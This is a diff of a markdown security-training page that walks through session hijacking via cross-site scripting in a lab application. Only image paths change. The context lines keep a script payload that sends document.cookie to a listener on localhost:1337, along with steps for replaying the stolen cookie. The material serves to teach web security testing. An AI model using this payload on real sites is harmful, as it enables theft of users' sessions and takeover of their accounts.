@@ -31,7 +31,7 @@ username : admin\
 password: admin
 {% endhint %}
 
-![](../../.gitbook/assets/session-hijacking-xss-1.png)
+![](../../.gitbook/assets/python/Session-Hijacking/1.png)
 
 After authenticating to the server we can see that the user has a text-area field at his dissposal to insert user input. When we press submit we find that this user supplied input is being reflected on the side of the client. This is a perfect indicator that we might want to start testing for cross site scripting attacks.
 
@@ -45,13 +45,13 @@ We can tell if we can hijack the session information by inspecting the cookies a
 
 Highlighted in red we find this attribute and see that it is not activated for this application
 
-![](../../.gitbook/assets/session-hijacking-xss-2.png)
+![](../../.gitbook/assets/python/Session-Hijacking/2.png)
 
 Now, we can inject the a piece of malicious javascript to see if we can prompt an alert box that displays the applications session information.
 
-![](../../.gitbook/assets/session-hijacking-xss-3.png)
+![](../../.gitbook/assets/python/Session-Hijacking/3.png)
 
-![](../../.gitbook/assets/session-hijacking-xss-4.png)
+![](../../.gitbook/assets/python/Session-Hijacking/4.png)
 
 ## Exploitation
 
@@ -90,7 +90,7 @@ Of course you can also run your app on whatever service you want it does not hav
 
 Now that the service is running we want to inject the malicious piece of javascript that is responsible for hijacking the victims session information.
 
-![](../../.gitbook/assets/session-hijacking-xss-5.png)
+![](../../.gitbook/assets/python/Session-Hijacking/5.png)
 
 ```markup
 <script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
@@ -98,6 +98,6 @@ Now that the service is running we want to inject the malicious piece of javascr
 
 After injecting the malicious javascript in the text-area field we see the following GET request entering the server logs.
 
-![](../../.gitbook/assets/session-hijacking-xss-6.png)
+![](../../.gitbook/assets/python/Session-Hijacking/6.png)
 
 The attacker can now change the session cookie value in his browers console by the session cookie that we hijacked with our malicous payload to "hijack" the victims account.
